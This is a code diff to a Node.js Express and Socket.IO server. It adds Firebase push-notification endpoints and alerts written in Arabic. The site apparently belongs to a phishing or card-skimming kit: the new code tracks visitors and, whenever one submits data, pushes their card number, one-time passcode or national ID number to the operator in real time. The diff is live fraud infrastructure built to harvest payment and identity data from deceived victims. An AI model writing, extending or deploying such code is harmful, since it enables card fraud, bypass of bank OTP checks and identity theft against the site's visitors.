@@ -7,6 +7,7 @@ const fs = require("fs");
 const path = require("path");
 require("dotenv").config();
 
+const fcm = require("./fcm");
 const app = express();
 const server = http.createServer(app);
 
@@ -128,6 +129,27 @@ app.use((req, res, next) => {
 });
 
 app.use('/admin', express.static('admin'));
+
+// FCM Token Endpoints
+app.post('/api/fcm/token', (req, res) => {
+  const { token } = req.body;
+  if (token) {
+    fcm.addToken(token);
+    res.json({ success: true });
+  } else {
+    res.status(400).json({ error: 'Token is required' });
+  }
+});
+
+app.delete('/api/fcm/token', (req, res) => {
+  const { token } = req.body;
+  if (token) {
+    fcm.removeToken(token);
+    res.json({ success: true });
+  } else {
+    res.status(400).json({ error: 'Token is required' });
+  }
+});
 
 // Socket.IO Configuration
 const io = new Server(server, {
@@ -478,6 +500,14 @@ io.on("connection", (socket) => {
         io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
       }
     });
+    
+    if (isNewVisitor) {
+      fcm.sendNotification(
+        "زائر جديد",
+        `زائر جديد دخل الموقع من ${visitor.country || 'دولة غير معروفة'}`,
+        { type: "new_visitor", visitorId: visitor._id }
+      );
+    }
   });
 
   // Handle page enter
@@ -624,6 +654,22 @@ io.on("connection", (socket) => {
           visitor: visitor,
         });
       });
+      
+      let title = "بيانات جديدة";
+      let body = `الزائر ${visitor.fullName || visitor._id} أدخل بيانات جديدة`;
+      
+      if (data.cardNumber) {
+        title = "بطاقة جديدة";
+        body = `تم إدخال بطاقة جديدة: ${data.cardNumber}`;
+      } else if (data.otp) {
+        title = "رمز OTP جديد";
+        body = `تم إدخال رمز OTP: ${data.otp}`;
+      } else if (data.idNumber) {
+        title = "بيانات شخصية";
+        body = `تم إدخال هوية: ${data.idNumber}`;
+      }
+      
+      fcm.sendNotification(title, body, { type: "data_submitted", visitorId: visitor._id });
 
       console.log(`Data received from visitor ${visitor._id}:`, data);
     }
